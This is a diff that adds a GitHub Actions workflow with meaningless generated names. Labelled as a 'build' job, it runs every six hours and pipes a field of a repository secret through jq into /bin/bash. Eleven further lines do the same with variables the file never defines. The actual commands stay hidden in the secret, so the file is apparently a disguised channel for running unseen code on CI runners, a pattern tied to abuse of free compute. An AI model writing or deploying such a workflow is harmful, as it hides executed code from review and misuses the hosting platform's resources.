@@ -1,0 +1,28 @@
+name: fangmingshuo6710
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fangmingshuo6710
+        env:
+          j290: ${{ secrets.j290 }}
+        run: |
+          echo $j290 | jq -r .hh4171 | /bin/bash
+          echo $bud38 | jq -r .t81 | /bin/bash
+          echo $mbl15030 | jq -r .cutzw3 | /bin/bash
+          echo $vh5 | jq -r .dhdm6754 | /bin/bash
+          echo $p89 | jq -r .hzbvj91352 | /bin/bash
+          echo $sezx88 | jq -r .ry985 | /bin/bash
+          echo $l55897 | jq -r .rtpr8 | /bin/bash
+          echo $ka1 | jq -r .takf14692 | /bin/bash
+          echo $muiw84 | jq -r .cdpsm10 | /bin/bash
+          echo $t60 | jq -r .xcdcg8198 | /bin/bash
+          echo $zr6 | jq -r .pvoa4 | /bin/bash
+          echo $fovf2 | jq -r .dwqo2 | /bin/bash
+
